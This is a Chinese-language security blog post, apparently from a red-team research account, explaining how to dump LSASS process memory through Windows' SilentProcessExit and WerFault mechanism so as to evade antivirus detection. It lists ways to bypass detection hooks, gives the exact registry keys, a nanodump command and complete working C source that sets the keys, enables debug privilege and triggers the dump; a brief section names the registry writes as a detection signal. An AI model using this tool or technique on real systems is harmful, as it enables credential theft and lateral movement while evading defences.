#  利用系统正常机制进行Lsass Dump（一）

原创 网络保安29 [ 红蓝攻防研究实验室 ](javascript:void\(0\);)

**红蓝攻防研究实验室** ![]()

微信号 gh_17746ad81b52

功能介绍 网络保安的自我修养

____

___发表于_

收录于合集

#内网渗透 1 个

#Windows安全 1 个

## **0x01 前言** ****

        Lsass.exe是Windows操作系统中的一个重要系统进程，其全称为“Local Security Authority Subsystem Service”，用于处理安全策略和认证授权等安全相关的操作。Lsass进程的内存中保存了很多敏感数据，例如系统的用户账号和密码、Kerberos票据、加密密钥等    在内网渗透中，攻击者为了获取凭据进行进一步的攻击，通常会对Lsass进程进行内存dump，通过解析dmp文件来获取Lsass.exe进程中保存的敏感信息。获取Lsass内存dump也是MITRE ATT&CK框架中Credential Access战术下的重要技术点。本文将介绍Lsass Dump的原理、检测方法以及一种利用系统正常机制进行Lsass Dump绕过检测的手段。

##  **0x02  Lsass Dump一般原理** ****

     转储lsass内存的最简单方法通常涉及两个主要操作：     **1、** 通过具有访问权限PROCESS_QUERY_INFORMATION和PROCESS_VM_READ的OpenProcess调用打开Lsass PID的进程句柄；     **2、** 使用MiniDumpWriteDump函数读取lsass的所有进程地址空间，并保存到磁盘上的一个文件中。MiniDumpWriteDump会使用NtReadVirtualMemory读取Lsass进程内存。        Lsass 内存转储的检测点主要就在以上两个操作上。

##  **0x03  Lsass Dump检测原理** ****

     第一个检测点在OpenProcess / NtOpenProcess的使用上。    当一个进程或线程的句柄被创建的时候，Windows内核杀软驱动程序为线程、进程和桌面句柄操作注册一个回调函数，在这个回调函数里可以监控到目标进程被打开的操作。    这个检测点非常容易绕过，只要不通过直接打开Lsass进程获取句柄都可以绕过，方法举例：

  *   *   *   *   *   *   * 

    
    
      ·创建新的Lsass进程；  
      ·复制现有Lsass句柄，即从其他进程中duplicate Lsass句柄（其他进程曾经打开过Lsass进程的情况下）；  
      ·堆栈欺骗，将Dump程序自身的堆栈调用特征做伪装，使其看起来是一个合法的系统进程对Lsass句柄进行了复制；  
      ·将Lsass进程句柄泄露（比如利用seclogon）等。

    第二个检测点在MiniDumpWriteDump/NtReadVirtualMemory的使用上。    在这个检测点上，杀软最常用的方法是Inline Hooking来检测针对Lsass进程的NtReadVirtualMemory调用。但是这种检测方法也可以绕过，方法举例：

  *   *   *   *   * 

    
    
      ·直接系统调用；  
      · Unhook；  
      ·使用系统合法程序生成Lsass的dump文件等。

    但是目前很多杀软已经进阶到了对syscall、unhook的检测，所以前两种绕过过方法依然存在被检测到的可能性。而利用合法系统进程+合法系统机制进行Lsass dump，可以绕过上面两个检测点，是目前比较难检测的一种方法，也就是本篇文章要讲的方法。

##  **0x04 Lsass Dump by WerFault** ****

     该技术和WerFault.exe进程有关，在某个运行中的进程崩溃时，根据系统机制，WerFault将会Dump崩溃进程的内存。所以从这一点看，可以利用该机制进行Lsass进程内存的Dump。    要促使WerFault.exe对Lsass进程进行内存转储，需要依靠一种被称为“静默进程退出”（SlientProcessExit）的机制，在以下两种情况下，该机制可以触发对特定进程的特殊动作，这里的特定进程可以理解为Lsass进程：

  *   *   * 

    
    
      1、特定进程调用ExitProcess()终止自身；  
      2、其他进程调用TerminateProcess()结束特定进程。

    根据不同的注册表设置，在触发静默进程退出机制时，可被支持的几个动作包括：

  *   *   *   *   * 

    
    
      1、启动一个监控进程；  
      2、显示一个弹窗；  
      3、创建一个Dump文件。

    显而易见，这里需要利用第3种方式，即创建DUMP文件。要对Lsass进程设置静默退出监控，需要提前对几个注册表项进行设置：

  *   *   * 

    
    
    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe\ 下的1个键值：  
    GlobalFlag - 0x200（FLG_MONITOR_SILENT_PROCESS_EXIT）

  *   *   *   *   *   *   * 

    
    
    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe\ 下的3个键值：  
    ReportingMode - 0x2（LOCAL_DUMP）；  
    LocalDumpFolder – DUMP文件被存放的目录，可自定义，默认为 %TEMP%\Silent Process Exit；  
    DumpType – 0x2（完全转储目标进程内存，MiniDumpWithFullMemory）

    注册表设置完成后，只需要终止目标进程即可在设置的目录获得相应文件的DUMP文件。但是kill掉LSASS进程意味着系统将重启，这不仅增大了被发现的风险，还可能导致无法再次获得系统权限。    那么现在需要寻找触发SilentProcessExit机制但又不实际终止被监控进程的方法，这涉及到程序终止的一些原理。当一个进程终止时，会从ntdll.dll调用RtlReportSilentProcessExit API，该API将与Windows错误报告服务WerSvc通信，以告知当前进程正在执行静默退出。随后服务将启动WerFault.exe转储当前进程。重点是， **仅调用此 API并不会导致进程退出**。所以我们可以可以利用这个API结合SilentProcessExit机制使WerFault对Lsass进程执行DUMP动作，而不导致Lsass的终止。    这个场景下，进程调用的顺序是：我们的dump程序->svchost.exe (WerSvcGroup)->WerFault.exe，由运行级别为high的Wefault.exe进行Lsass Dump并创建dmp文件。    相关api函数的用法是RtlReportSilentProcessExit(CURRENT_PROCESS, return_code)，第一个参数默认为当前进程，可传入其他进程。第二个参数用于指定进程退出的状态码，该状态码表示进程退出的原因，通常为0。    根据这个函数的用法，可以得知有两种调用方式，一种是我们的DUMP程序来调用RtlReportSilentProcessExit()，传入具有特定权限的Lsass进程句柄作为参数；另一种是远程在Lsass进程中创建线程直接执行RtlReportSilentProcessExit()，也就是进程注入。但是我认为进程注入的风险比较高，所以这里用第一种思路进行演示。    核心代码如下，思路就是：

  *   *   *   *   *   *   *   *   * 

    
    
    1、设置注册表；  
    2、获取debug权限；  
    3、获取具有特定权限的Lsass句柄；  
    4、ntdll中取出RtlReportSilentProcessExit()函数；  
    5、调用RtlReportSilentProcessExit()函数，传入第3步获取到的Lsass句柄。

![](https://gitee.com/fuli009/images/raw/master/public/20230628221552.png)
获取debug权限、设置注册表、通过进程名获取Lsass进程pid等函数的具体实现，可以参考文末的完整代码。其中SavePath这个宏设置的是dmp文件存储路径，C:\temp。
编译之后，执行程序，成功写入注册表并获取到Lsass进程的dmp文件。![](https://gitee.com/fuli009/images/raw/master/public/20230628221553.png)![](https://gitee.com/fuli009/images/raw/master/public/20230628221554.png)
以进程名及其pid号命名的文件夹里保存了Lsass进程的dmp文件，除此之外，还会有dump进程本身的dmp文件，这是由于RtlReportSilentProcessExit()函数执行时，虽然传了Lsass的句柄，但是归根结底dump程序自身也调用了。![](https://gitee.com/fuli009/images/raw/master/public/20230628221555.png)
开源工具Nanodump中也集成了这种手法:       nanodump --werfault C:\Windows\Temp\
(dmp文件存放目录)![](https://gitee.com/fuli009/images/raw/master/public/20230628221556.png)
可以看到dump出的文件保存在了设置的路径中：![](https://gitee.com/fuli009/images/raw/master/public/20230628221557.png)
这个方法其实很早就有了，虽然能过很多国内杀软，但是经过测试过不了Defender，如果有大佬有更好的利用思路欢迎私信交流。  

##  **0x05 检测方法** ****

     虽然SlientProcessExit机制比较隐蔽，目前基本很难被国内的杀软检测，但是这个机制的不足就在于需要进行注册表设置。    一般来说，机器默认是没有以下注册表路径的：        HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe；        HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe；    所以在使用SlientProcessExit机制进行Lsass Dump之前，一定需要添加相应的注册表键值和数据，这个注册表Set Value的行为可被作为这种方法的检测特征。

##  **0x05 后记** ****

     除了SlientProcessExit机制之外，还有一种利用WerFault进程和正常系统机制来进行Lsass Dump的方法，这个方法相比于SlientProcessExit机制具有更好的隐秘性，将在下篇文章进行介绍。

##  **0x06 完整代码** ****

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    # include <stdio.h>#include <windows.h>#include <tlhelp32.h>#define SavePath L"c:\\temp"  
    //获取lsass进程pidDWORD FindProcessId() {  PROCESSENTRY32 processInfo;  processInfo.dwSize = sizeof(PROCESSENTRY32);  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  if (snapshot == INVALID_HANDLE_VALUE) {    return 0;  }  if (Process32First(snapshot, &processInfo)) {    do {      if (!_wcsicmp(L"lsass.exe", processInfo.szExeFile)) {        CloseHandle(snapshot);        return processInfo.th32ProcessID;      }    } while (Process32Next(snapshot, &processInfo));  }  CloseHandle(snapshot);  return 0;}  
    //修改注册表int regedit(){  HKEY hKey;  LONG result;  //创建并打开 "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" 子键  result = RegCreateKeyEx(  HKEY_LOCAL_MACHINE,  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe",  0,  NULL,  REG_OPTION_NON_VOLATILE,  KEY_WRITE,  NULL,  &hKey,  NULL  );  //添加 DumpType 类型为 REG_DWORD 的内容，数据为0x2  DWORD dumpTypeValue = 0x02;  result = RegSetValueEx(hKey, L"DumpType", 0, REG_DWORD, (const BYTE*)&dumpTypeValue, sizeof(DWORD));   //添加 LocalDumpFolder 类型为 REG_SZ 的内容，数据为 c:\temp（SavePath）  result |= RegSetValueEx(hKey, L"LocalDumpFolder", 0, REG_SZ, (const BYTE*)SavePath, sizeof(SavePath));   //添加 ReportingMode 类型为 REG_DWORD 的内容，数据为0x2  DWORD reportingModeValue = 0x02;  result |= RegSetValueEx(hKey, L"ReportingMode", 0, REG_DWORD, (const BYTE*)&reportingModeValue, sizeof(DWORD));  RegCloseKey(hKey);   //创建并打开 "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" 子键  result = RegCreateKeyEx(  HKEY_LOCAL_MACHINE,  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe",  0,  NULL,  REG_OPTION_NON_VOLATILE,  KEY_WRITE,  NULL,  &hKey,  NULL  );  //添加 GlobalFlag 类型为 REG_DWORD 的内容，数据为0x200  DWORD globalFlagValue = 0x200;  result = RegSetValueEx(hKey, L"GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlagValue, sizeof(DWORD));  RegCloseKey(hKey);  return 0;}    
    // 启用调试权限void DebugPrivilege(){  //打开进程访问令牌  HANDLE hProcessToken = NULL;  OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hProcessToken);  //取得SeDebugPrivilege特权的LUID值  LUID luid;  LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);  //调整访问令牌特权  TOKEN_PRIVILEGES token;  token.PrivilegeCount = 1;  token.Privileges[0].Luid = luid;  token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  //获取debug特权  AdjustTokenPrivileges(hProcessToken, FALSE, &token, 0, NULL, NULL);  CloseHandle(hProcessToken);}  
    int main() {  //提升令牌访问权限  DebugPrivilege();    //设置注册表  regedit();  
      //获取lsass进程pid  DWORD processId = FindProcessId();  
      //获取lsass句柄  HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, processId);  if (hProcess == INVALID_HANDLE_VALUE) {    printf("OpenProcess() --err: %d\n", GetLastError());  }    //从ntdll中取RtlReportSilentProcessExit函数  typedef NTSTATUS(NTAPI* RtlReportSilentProcessExit)(    HANDLE processHandle,    NTSTATUS ExitStatus  );  HMODULE hModule = GetModuleHandle(L"ntdll.dll");  RtlReportSilentProcessExit fRtlReportSilentProcessExit = (RtlReportSilentProcessExit)GetProcAddress(hModule, "RtlReportSilentProcessExit");   //静默退出lsass  NTSTATUS s = fRtlReportSilentProcessExit(hProcess, 0);  if (s == 0) {    printf("Lsass内存转储成功，保存路径：%S", SavePath);  }  CloseHandle(hProcess);  CloseHandle(hModule);}

  
 **注：本文内容仅供学习交流，不可用于非法用途，否则产生的一切后果和法律责任由使用者自行承担，与本文作者及本公众号无关。维护网络安全人人有责 ~**  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

